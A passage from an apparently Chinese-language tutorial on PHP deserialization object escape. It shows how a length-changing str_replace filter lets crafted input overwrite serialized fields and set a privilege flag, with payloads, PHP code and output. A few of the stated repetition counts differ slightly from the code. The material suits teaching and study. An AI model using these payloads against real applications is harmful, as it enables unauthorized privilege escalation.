class=\"comment\">//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&quot;isVIP&quot;;i:0</span></span><br></pre></td></tr></table></figure>\n<p>这个时候我们增加一个函数，用于对<strong> admin</strong> 字符进行替换，将<strong> admin</strong> 替换为<strong> hacker</strong>，替换函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这一段程序的输出为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>那么我们的 admin 就会被替换为 hacker</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure>\n<p>仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，<strong>因此我们可以使用对象逃逸将 isVIP 变为 1</strong></p>\n<p>在字符变多的对象逃逸中，我们需要构造我们需要的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;    //length=47</span><br></pre></td></tr></table></figure>\n<p>因为我们需要逃逸的字符串长度为<strong> 47</strong>，并且<strong> admin</strong> 每次过滤之后都会变成<strong> hacker</strong>，也就是说每出现一次<strong> admin</strong>，就会多<strong> 1</strong> 个字符。</p>\n<p>因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了</p>\n<p>因此我们在可控变量处，重复<strong> 47</strong> 遍<strong> admin</strong>，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后我们利用代码做拼接形成完整的 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hacker&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//上面的第一个&#x27;&#x27;中是我们构造的目标串，第二个&#x27;&#x27;中是马上要被覆盖的串</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>由于<strong>反序列化后，多余的子串会被抛弃</strong>， <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </code> 我们可以直接无视</p>\n<p>尝试反序列化验证我们的 isVIP 是否变为了 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"string\">&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter_unseri</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a_seri_filter</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$a_seri_filter_unseri</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//result：</span></span><br><span class=\"line\"><span class=\"keyword\">object</span>(user)<span class=\"comment\">#1 (3) &#123;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;username&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">282</span>) <span class=\"string\">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;password&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">6</span>) <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;isVIP&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？</p>\n<p>在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中</p>\n<p>最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量</p>\n<p>​\t上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin</p>\n<p>4. 将我们构造的 payload 放到程序中，得到完整的 payload：</p>\n<p>​\t上述例子中，我们构造的 payload 是：</p>\n<p><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code></p>\n<p>通过程序：</p>\n<p><code>$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;','123456');</code></p>\n<p>生成我们最终的 payload：</p>\n<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>\n<p>5.unserialize 进行验证</p>\n</blockquote>\n<h5 id=\"过滤后字符变少\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变少\">#</a> 过滤后字符变少</h5>\n<p>同样的过滤，这次将 admin 变为 hack</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hack&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">result:</span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;user&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;hack&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;123456&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;isVIP&quot;</span>;i:<span class=\"number\">0</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>同样，我们想把 isVIP 变为 1，比较一下<strong>现有子串</strong>和<strong>目标子串</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;\t//现有子串</span><br><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br></pre></td></tr></table></figure>\n<p>因为过滤的时候，将<strong> 5</strong> 个字符删减为了<strong> 4</strong> 个，所以和上面字符变多的情况相反，随着加入的<strong> admin</strong> 的数量增多，<strong>现有子串</strong>后面会缩进来。</p>\n<p>计算一下<strong>目标子串</strong>的长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br><span class=\"line\">//长度为47</span><br></pre></td></tr></table></figure>\n<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class=\"line\">//长度为22</span><br></pre></td></tr></table></figure>\n<p>因为每次过滤的时候都会少<strong> 1</strong> 个字符，因此我们先将<strong> admin</strong> 字符重复<strong> 22</strong> 遍，这里 22 遍是大概值，后续还需要调整</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;123456&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>\n<p>105 个字符结束后，位置如下</p>\n<p><code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</code></p>\n<p>也就是我们覆盖了 <code>;s:8:&quot;password&quot;;s:6:</code> ，接下来我们的 username 的值变会覆盖后续的字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>解决办法是</strong>：多添加<strong> 2</strong> 个<strong> admin</strong>，这样就可以补上缺少的字符。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>115 个字符的覆盖范围 <code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</code></p>\n<p>可以看到，这一下就对了。</p>\n<p>我们将对象反序列化然后输出，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class user&#123;</span><br><span class=\"line\">\tpublic $username;</span><br><span class=\"line\">\tpublic $password;</span><br><span class=\"line\">\tpublic $isVIP;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic function __construct($u,$p)&#123;</span><br><span class=\"line\">\t\t$this-&gt;username = $u;</span><br><span class=\"line\">\t\t$this-&gt;password = $p;</span><br><span class=\"line\">\t\t$this-&gt;isVIP = 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">\treturn str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\">$a_seri_filter_unseri = unserialize($a_seri_filter);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a_seri_filter_unseri);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>得到结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object(user)#2 (3) &#123;</span><br><span class=\"line\">  [&quot;username&quot;]=&gt;</span><br><span class=\"line\">  string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class=\"line\">  [&quot;password&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;123456&quot;</span><br><span class=\"line\">  [&quot;isVIP&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结一下变短的步骤：</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析</p>\n<p>​\t上述例子中，我们的目标长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>  为 47，到下一个可控变量长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>  为 22</p>\n<p>​\t那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP</p>\n<p>4. 进行覆盖与调整</p>\n<p>​\t上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &quot; 的位置和前面的字符串数量的位置相同</p>\n<p>5. 进行反序列化验证</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//变长</span><br><span 